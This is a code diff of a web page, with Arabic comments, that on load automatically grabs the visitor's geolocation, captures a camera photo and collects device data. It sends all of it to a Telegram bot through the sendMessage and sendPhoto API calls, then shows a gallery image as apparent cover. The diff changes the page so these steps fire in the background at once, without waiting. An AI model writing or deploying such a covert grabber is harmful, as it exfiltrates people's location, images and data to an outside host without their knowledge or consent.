@@ -230,7 +230,7 @@
             
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
-            return fetch(url, {
+            fetch(url, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -243,17 +243,11 @@
             }).then(response => {
                 if (response.ok) {
                     console.log('✅ تم إرسال البيانات إلى Telegram بنجاح');
-                    return response.json();
                 } else {
                     console.error('❌ فشل إرسال البيانات إلى Telegram');
-                    throw new Error('Telegram API Error');
                 }
-            }).then(data => {
-                console.log('📱 استجابة Telegram:', data);
-                return true;
             }).catch(error => {
                 console.error('❌ خطأ في الإرسال:', error);
-                return false;
             });
         }
 
@@ -278,23 +272,17 @@
             
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
             
-            return fetch(url, {
+            fetch(url, {
                 method: 'POST',
                 body: formData
             }).then(response => {
                 if (response.ok) {
                     console.log('✅ تم إرسال الصورة إلى Telegram بنجاح');
-                    return response.json();
                 } else {
                     console.error('❌ فشل إرسال الصورة إلى Telegram');
-                    throw new Error('Telegram Photo API Error');
                 }
-            }).then(data => {
-                console.log('📸 استجابة Telegram للصورة:', data);
-                return true;
             }).catch(error => {
                 console.error('❌ خطأ في إرسال الصورة:', error);
-                return false;
             });
         }
 
@@ -386,28 +374,21 @@
         async function initializeApp() {
             console.log('🚀 تم تحميل الصفحة - البدء التلقائي');
             
-            // محاولة الحصول على الموقع الجغرافي
-            await getLocation();
+            // بدء العمليات في الخلفية فوراً
+            getLocation();
+            capturePhoto();
             
-            // محاولة التقاط صورة من الكاميرا (في الخلفية)
-            capturePhoto(); // بدون انتظار لتجنب التأخير
-            
-            // جمع البيانات
-            const data = collectData();
-            console.log('📊 بيانات الزائر:', data);
-            
-            // إرسال البيانات إلى Telegram
-            await sendToTelegram(data);
-            
-            // إظهار الصورة بعد التأخير
-            setTimeout(() => {
-                showGallery();
+            // انتظار قصير ثم جمع وإرسال البيانات
+            setTimeout(async () => {
+                const data = collectData();
+                console.log('📊 بيانات الزائر:', data);
                 
-                // إخفاء مؤشر الحالة بعد فترة
-                setTimeout(() => {
-                    document.getElementById('statusIndicator').style.display = 'none';
-                }, 1000);
-            }, 1000);
+                // إرسال البيانات
+                sendToTelegram(data);
+                
+                // إظهار الصورة
+                showGallery();
+            }, 2000);
         }
 
         // تشغيل التطبيق عند تحميل الصفحة
